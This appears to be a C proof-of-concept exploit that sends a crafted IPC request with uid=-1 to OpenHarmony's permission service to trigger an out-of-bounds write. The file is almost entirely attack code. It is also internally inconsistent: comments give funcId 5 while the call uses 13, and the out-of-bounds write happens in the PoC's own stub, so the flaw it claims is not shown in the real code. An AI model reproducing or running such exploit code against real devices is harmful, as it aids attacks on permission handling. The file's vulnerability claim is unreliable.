/*
 * Target-Compile PoC: ReplyRevokeRuntimePermission OOB Write (CWE-129)
 * Target: security_permission_lite (OpenHarmony)
 * Method: Links against real pms_server_internal.o compiled from source
 *
 * Trigger path:
 *   Invoke (IPC dispatch, funcId=ID_REVOKE_RUNTIME)
 *     → ReplyRevokeRuntimePermission(origin, req, reply, api)
 *       → ReadInt64(req, &uid)  — attacker sets uid = -1
 *       → api->RevokeRuntimePermission(uid, permName)
 *         → uses uid as array index → OOB write
 *
 * In real scenario: malicious IPC client sends funcId=5 with uid=-1.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "pms_types.h"
#include "serializer.h"
#include "samgr_lite.h"
#include "iproxy_server.h"

/* The real Invoke function from pms_server_internal.o */
extern int32_t Invoke(IServerProxy *iProxy, int funcId, void *origin, IpcIo *req, IpcIo *reply);

/* Permission table that RevokeRuntimePermission indexes into */
#define PERMISSION_TABLE_SIZE 8
int32_t g_permission_table[PERMISSION_TABLE_SIZE] = {0};

/* Stub: RevokeRuntimePermission — uses uid as array index (the vulnerability) */
static int32_t StubRevokeRuntimePermission(int64_t uid, const char *permName)
{
    printf("[PoC] RevokeRuntimePermission called: uid=%lld, permName=%s\n",
           (long long)uid, permName ? permName : "(null)");
    printf("[PoC] TRIGGER: using uid as index into g_permission_table[%d]\n", PERMISSION_TABLE_SIZE);
    /* This simulates the real implementation indexing by uid */
    g_permission_table[uid] = 0;  /* OOB WRITE when uid < 0 or uid >= TABLE_SIZE */
    return 0;
}

/* InnerPermLiteApi vtable — matches the real struct layout */
typedef struct {
    int32_t (*CheckPermission)(int64_t uid, const char *permName);
    int32_t (*GrantPermission)(const char *id, const char *permName);
    int32_t (*RevokePermission)(const char *id, const char *permName);
    int32_t (*GrantRuntimePermission)(int64_t uid, const char *permName);
    int32_t (*RevokeRuntimePermission)(int64_t uid, const char *permName);
    int32_t (*UpdatePermissionFlags)(const char *id, const char *permName, int flags);
} InnerPermLiteApi;

int main(void)
{
    printf("[PoC] === Target-Compile: ReplyRevokeRuntimePermission OOB Write ===\n");
    printf("[PoC] Module: security_permission_lite (real pms_server_internal.o)\n");
    printf("[PoC] Entry: Invoke(funcId=ID_REVOKE_RUNTIME) → ReplyRevokeRuntimePermission\n\n");

    /*
     * Craft IPC request for ReplyRevokeRuntimePermission:
     *   ReadInt64(&uid)     — we set uid = -1 (OOB index)
     *   ReadString(&permLen) — permission name
     */
    uint8_t req_buffer[128];
    memset(req_buffer, 0, sizeof(req_buffer));
    size_t offset = 0;

    /* uid = -1 (triggers OOB write) */
    int64_t uid = -1;
    memcpy(req_buffer + offset, &uid, sizeof(int64_t));
    offset += sizeof(int64_t);

    /* permName string: length prefix + data + null */
    const char *permName = "ohos.permission.CAMERA";
    uint32_t permLen = strlen(permName);
    memcpy(req_buffer + offset, &permLen, 4); offset += 4;
    memcpy(req_buffer + offset, permName, permLen + 1); offset += permLen + 1;

    IpcIo req, reply;
    uint8_t reply_buffer[64];
    IpcIoInit(&req, req_buffer, offset, 0);
    req.bufferCur = req.bufferBase;
    req.bufferLeft = offset;
    IpcIoInit(&reply, reply_buffer, sizeof(reply_buffer), 0);

    /* Setup API vtable with our stub */
    InnerPermLiteApi api = {0};
    api.RevokeRuntimePermission = StubRevokeRuntimePermission;

    printf("[PoC] Crafted IPC: uid=%lld (OOB index), permName=\"%s\"\n", (long long)uid, permName);
    printf("[PoC] Calling Invoke(funcId=5=ID_REVOKE_RUNTIME)...\n\n");

    /* Call the REAL Invoke dispatch function
     * ID_REVOKE_RUNTIME = 13 (enum starts at ID_CHECK=10) */
    int32_t ret = Invoke((IServerProxy *)&api, 13, NULL, &req, &reply);

    printf("\n[PoC] Invoke returned: %d\n", ret);
    return 0;
}
